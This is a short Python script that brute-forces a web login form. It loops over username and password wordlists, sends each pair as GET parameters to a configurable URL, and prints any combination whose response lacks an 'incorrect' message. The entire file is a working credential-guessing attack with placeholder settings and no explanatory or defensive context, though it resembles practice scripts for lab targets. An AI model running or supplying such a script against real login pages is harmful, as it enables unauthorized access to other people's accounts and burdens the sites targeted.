import requests


#configurations

username = 'path to usernames'
password = 'path to passwords'
url = 'url'
invalid_message = 'incorrect'


with open(username, 'r') as user_file:
    usernames = user_file.readlines()

with open(password, 'r') as pass_file:
    passwords = pass_file.readlines()

for user in usernames:
    user = user.strip()
    for passw in passwords:
        passw = passw.strip()

        data = {
            'username': user,
            'password': passw,
            'Login': "Login",
        }
        response = requests.get(url,params=data)
        if invalid_message in response.text:
            pass
        else:
            print('username = ', user , 'password = ',passw)